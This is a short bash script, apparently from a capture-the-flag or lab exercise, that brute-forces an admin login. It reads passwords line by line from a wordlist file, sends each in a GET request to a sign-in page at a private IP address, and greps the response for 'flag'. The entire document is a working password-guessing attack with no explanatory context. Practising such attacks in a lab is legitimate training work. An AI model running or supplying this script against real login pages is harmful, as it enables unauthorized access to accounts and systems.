#!/bin/bash
filename='dic2.txt'
n=1
while read line; do
# reading each line
echo "Line No. $n : $line"
curl -s http://192.168.1.186/\?page\=signin\&username\=admin\&password\=$line\&Login\=Login | grep flag
n=$((n+1))
done < $filename
